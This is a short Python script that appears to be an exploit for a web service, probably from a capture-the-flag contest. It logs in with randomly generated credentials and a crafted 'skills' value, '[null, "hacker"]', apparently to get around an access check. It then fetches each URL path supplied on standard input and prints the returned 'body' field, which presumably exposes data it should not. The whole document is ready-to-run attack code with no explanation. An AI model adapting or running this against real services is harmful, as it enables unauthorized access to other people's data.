#!/usr/bin/env python3

import json
import sys
import requests
import random
import string

def get_rand_string(l):
	return ''.join(random.choice(string.ascii_lowercase) for _ in range(l + random.randint(-l//2, l//2)))


def main(hostname):
	state = requests.Session()
	resp = state.post('http://{}/login'.format(hostname), data={'user': get_rand_string(15), 'password': get_rand_string(15), 'skills': '[null, "hacker"]'})
	if resp.status_code != 200:
		print("can't login")
	for url in sys.stdin:
		resp = state.get('http://{}/{}'.format(hostname, url.strip().lstrip('/')))
		if resp.status_code == 200:
			print(resp.json()['body'])
	

if __name__ == '__main__':
	main(sys.argv[1])